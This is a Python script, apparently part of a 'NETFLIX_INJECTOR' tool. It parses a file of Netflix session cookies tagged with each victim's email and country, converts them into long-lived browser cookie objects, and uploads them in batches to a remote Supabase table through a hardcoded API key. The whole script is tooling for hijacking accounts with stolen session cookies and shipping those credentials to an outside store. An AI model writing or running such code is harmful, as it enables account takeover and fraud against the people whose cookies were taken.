import json
import re
import requests
import uuid

INPUT_FILE = r"c:\Users\Admin\Downloads\NETFLIX_INJECTOR\NETFLIX_INJECTOR\newcookies.txt"
SUPABASE_URL = "https://arslamcjzixeqmalscye.supabase.co"
SUPABASE_KEY = "sb_publishable_VDYPdce8BVPg_J9kzFgKpA_dYAfDcP4"

def parse_and_insert():
    with open(INPUT_FILE, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    cookies_to_insert = []

    for line in lines:
        line = line.strip()
        if not line:
            continue

        netflix_id_match = re.search(r'NetflixId=(.*?)(?=\s\|)', line)
        email_match = re.search(r'\|\sEMAIL:(.*?)(?=\s\|)', line)
        country_match = re.search(r'\|\sCOUNTRY:(.*?)(?=\s\|)', line)

        if netflix_id_match and email_match:
            netflix_id_value = netflix_id_match.group(1)
            email = email_match.group(1).strip()
            country = country_match.group(1).strip() if country_match else None
            
            cookie_obj = {
                "name": "NetflixId",
                "value": netflix_id_value,
                "domain": ".netflix.com",
                "path": "/",
                "secure": True,
                "httpOnly": True,
                "sameSite": "Lax",
                "expirationDate": 2147483647,
                "session": False
            }
            
            cookies_json = json.dumps([cookie_obj])
            
            entry = {
                "cookies": cookies_json,
                "description": f"{email} | {country}" if country else email
            }
            cookies_to_insert.append(entry)

    if not cookies_to_insert:
        print("No valid cookies found.")
        return

    print(f"Found {len(cookies_to_insert)} cookies. Inserting...")

    # Batch insert
    batch_size = 50
    for i in range(0, len(cookies_to_insert), batch_size):
        batch = cookies_to_insert[i:i+batch_size]
        
        headers = {
            "apikey": SUPABASE_KEY,
            "Authorization": f"Bearer {SUPABASE_KEY}",
            "Content-Type": "application/json",
            "Prefer": "return=minimal"
        }
        
        response = requests.post(f"{SUPABASE_URL}/rest/v1/cookie_sessions", json=batch, headers=headers)
        
        if response.status_code == 201:
            print(f"Inserted batch {i//batch_size + 1}/{len(cookies_to_insert)//batch_size + 1}")
        else:
            print(f"Error inserting batch {i}: {response.status_code} - {response.text}")

if __name__ == "__main__":
    parse_and_insert()
